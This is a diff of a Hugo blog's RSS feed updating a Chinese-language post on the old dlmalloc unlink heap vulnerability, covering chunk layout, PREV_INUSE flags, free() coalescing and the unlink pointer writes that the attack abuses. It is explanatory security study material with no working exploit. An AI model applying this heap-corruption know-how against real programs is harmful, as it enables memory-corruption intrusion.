@@ -7,12 +7,12 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <lastBuildDate>Tue, 19 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="/categories/heap/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>[draft] Dlmalloc 2001 Unlink Vulnerability</title>
+        <title>Old Dlmalloc Unlink Vulnerability</title>
         <link>/p/dlmalloc_unlink_vuln/</link>
         <pubDate>Tue, 19 Apr 2022 00:00:00 +0000</pubDate>
         
         <guid>/p/dlmalloc_unlink_vuln/</guid>
-        <description>&lt;img src="/cover.png" alt="Featured image of post [draft] Dlmalloc 2001 Unlink Vulnerability" /&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
+        <description>&lt;img src="/p/dlmalloc_unlink_vuln/cover.png" alt="Featured image of post Old Dlmalloc Unlink Vulnerability" /&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://research.cs.wisc.edu/sonar/projects/mnemosyne/resources/doc/html/malloc-original_2src_2dlmalloc_8c-source.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ usermode/library/malloc-original/src/dlmalloc.c&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://phrack.org/issues/57/9.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -60,6 +60,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc_chunk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 32 位的 x86 架构上，&lt;code&gt;INTERNAL_SIZE_T&lt;/code&gt; 为 4 bytes；&lt;/p&gt;
+&lt;h3 id=&#34;before-free&#34;&gt;Before free()&lt;/h3&gt;
 &lt;p&gt;一个 Heap Chunk 即堆帧，看起来是这样：&lt;/p&gt;
 &lt;table&gt;
 &lt;thead&gt;
@@ -100,14 +101,14 @@
 &lt;p&gt;也就是说，当执行 &lt;code&gt;a = malloc(n)&lt;/code&gt; 时，a 实际指向的位置在 &lt;code&gt;mem&lt;/code&gt; 处；&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;size 处提到：最后两比特用于标记特殊的状态信息，他们是：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define PREV_INUSE 0x1
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define IS_MMAPPED 0x2
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define chunk_is_mmapped( p ) \
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;    ( (p)-&amp;gt;size &amp;amp; IS_MMAPPED )
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define prev_inuse( p ) \
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;    ( (p)-&amp;gt;size &amp;amp; PREV_INUSE )
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分别代表着：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#define PREV_INUSE 0x1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#define IS_MMAPPED 0x2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#define chunk_is_mmapped( p ) \&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&amp;gt;size &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; IS_MMAPPED &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#define prev_inuse( p ) \&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&amp;gt;size &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; PREV_INUSE &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分别代表着：&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;前一个 chunk 是否在使用中&lt;/li&gt;
 &lt;li&gt;是否通过 mmap 分配&lt;/li&gt;
@@ -120,6 +121,7 @@
 &lt;li&gt;当前块是通过 mmap 分配？&lt;em&gt;00101101&lt;/em&gt; 的倒数第二位为 &lt;em&gt;0&lt;/em&gt;：否。是通过 &lt;code&gt;malloc()&lt;/code&gt; 分配的&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
+&lt;h3 id=&#34;after-free&#34;&gt;After free()&lt;/h3&gt;
 &lt;p&gt;当我们 free(mem) 释放一个 chunk 时，dlmalloc 会检查前一个 chunk 是否也被 free：使用的就是上面提到的 &lt;code&gt;PREV_INUSE&lt;/code&gt; 标签&lt;/p&gt;
 &lt;p&gt;如果是的话，dkmalloc 会试图合并这两个 chunk：其目的是尽量减少堆中「可重复利用块」的数量&lt;/p&gt;
 &lt;p&gt;但是，如果前一个 chunk 正在使用中的话，dlmalloc 就无法做到去合并，这时候这个 chunk 会变成这样：&lt;/p&gt;
@@ -180,10 +182,7 @@
 &lt;p&gt;Fastbin: An array of lists holding recently freed small chunks.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Fastbin 并不使用双链表的结构&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Fastbin 的默认大小是 &lt;em&gt;80 bytes&lt;/em&gt;:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* offset 2 to use otherwise unindexable first 2 bins */&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define fastbin_index(sz)        ((((unsigned int)(sz)) &amp;gt;&amp;gt; 3) - 2)
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* The maximum fastbin request size we support */&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* The maximum fastbin request size we support */&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define MAX_FAST_SIZE     80
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果使用了 fastbin，那么就不会使用双链表，而漏洞恰好是与双链表有关的&lt;/p&gt;
 &lt;p&gt;所以，我们需要让 &lt;code&gt;size &amp;gt; 80&lt;/code&gt; 才能触发漏洞（无论本来 &lt;code&gt;size&lt;/code&gt; 就大于 &lt;em&gt;80&lt;/em&gt;，还是我们使用溢出的方式把 &lt;code&gt;size&lt;/code&gt; 覆盖上了大于 &lt;em&gt;80&lt;/em&gt; 的数值&lt;/p&gt;
@@ -202,7 +201,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看做：
 &lt;code&gt;(chunk + 0x8) = mem&lt;/code&gt; ; &lt;code&gt;(mem - 0x8) = chunk&lt;/code&gt;&lt;/p&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;free&#34;&gt;free()&lt;/h2&gt;
+&lt;h2 id=&#34;precondition-free&#34;&gt;Precondition: free()&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;free()&lt;/strong&gt; frees the memory space pointed to by &lt;em&gt;ptr&lt;/em&gt;, which must have been returned by a previous call to &lt;strong&gt;malloc()&lt;/strong&gt;, &lt;strong&gt;calloc()&lt;/strong&gt; or &lt;strong&gt;realloc()&lt;/strong&gt;.  Otherwise, or if &lt;strong&gt;free(&lt;em&gt;ptr&lt;/em&gt;)&lt;/strong&gt; has already been called before, undefined behavior occurs. If &lt;em&gt;ptr&lt;/em&gt; is NULL, no operation is per formed.&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -251,7 +250,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;......&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
-&lt;h3 id=&#34;第一个-if&#34;&gt;第一个 IF&lt;/h3&gt;
+&lt;h3 id=&#34;first-if&#34;&gt;First if&lt;/h3&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prev_inuse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;prevsize&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;prev_size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prevsize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
@@ -259,7 +258,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bck&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里是第一次出现 unlink，也就是问题的根源&lt;/p&gt;
-&lt;p&gt;这段代码很容易能看出来，它所做的事情就是，若前一个块不在使用中（已被 free）时，把 chunk 向前合并&lt;/p&gt;
+&lt;p&gt;这段代码很容易能看出来，它所做的事情就是，若前一个块不在使用中（判断依据是 size 的最后一个比特）时，把 chunk 向前合并&lt;/p&gt;
 &lt;p&gt;这里出现了从来没见过的另一个东西：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* Treat space at ptr + offset as a chunk */&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define chunk_at_offset(p, s)  ((mchunkptr)(((char*)(p)) + (s)))
@@ -269,7 +268,7 @@
 &lt;p&gt;接下来，把「上一个 chunk」给 &lt;code&gt;unlink(p, bck, fwd);&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;关于 &lt;code&gt;unlink()&lt;/code&gt; 会在下文详细说明&lt;/p&gt;
 &lt;hr&gt;
-&lt;h3 id=&#34;第二个-if&#34;&gt;第二个 IF&lt;/h3&gt;
+&lt;h3 id=&#34;second-if&#34;&gt;Second if&lt;/h3&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nextchunk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;av&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;cm&#34;&gt;/* get and clear inuse bit */&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;nextinuse&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inuse_bit_at_offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nextchunk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nextsize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
@@ -285,7 +284,8 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* check inuse bits in known places */&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define inuse_bit_at_offset(p, s)\
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;  (((mchunkptr)(((char*)(p)) + (s)))-&amp;gt;size &amp;amp; PREV_INUSE) 
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* Set size/use field */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* Set size/use field */&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define set_head(p, s)\
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;  ((p)-&amp;gt;size = (s))
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
@@ -293,6 +293,7 @@
 &lt;p&gt;&lt;code&gt;inuse_bit_at_offset(nextchunk, nextsize)&lt;/code&gt; 即：&lt;br&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;(nextchunk + nextsize)-&amp;gt; size &amp;amp; PREV_INUSE&lt;/code&gt; &lt;br&gt;&lt;/p&gt;
 &lt;p&gt;即获得了 &lt;em&gt;下个 chunk&lt;/em&gt; 的 &lt;em&gt;再下个 chunk&lt;/em&gt; 的 &lt;code&gt;PREV_INUSE&lt;/code&gt; 这个比特&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;（即当前 chunk 的下一个临近 chunk 是否在被使用）&lt;br&gt;&lt;/p&gt;
 &lt;p&gt;最后保存到 &lt;code&gt;nextinuse&lt;/code&gt; 中&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
@@ -307,7 +308,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nextchunk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bck&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nextsize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所做的事情是 &lt;code&gt;unlink(nextchunk, bck, fwd)&lt;/code&gt;，然后再把当前的 &lt;code&gt;size&lt;/code&gt; 增加 &lt;code&gt;nextsize&lt;/code&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;即当前面获得的 &lt;em&gt;下个 chunk&lt;/em&gt; 的 &lt;em&gt;再下个 chunk&lt;/em&gt; 的 &lt;code&gt;PREV_INUSE&lt;/code&gt; 这个比特为假（即当前 chunk 的下一个临近 chunk 不在被使用）时：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;unlink(nextchunk, bck, fwd)&lt;/code&gt;，然后再把当前的 &lt;code&gt;size&lt;/code&gt; 增加 &lt;code&gt;nextsize&lt;/code&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;结论是，在 &lt;code&gt;free(aChunk)&lt;/code&gt; 时，想要让 &lt;code&gt;unlink()&lt;/code&gt; 执行的话：&lt;/p&gt;
 &lt;p&gt;必须满足的条件：&lt;/p&gt;
@@ -361,15 +363,15 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;err&#34;&gt;↓&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt;
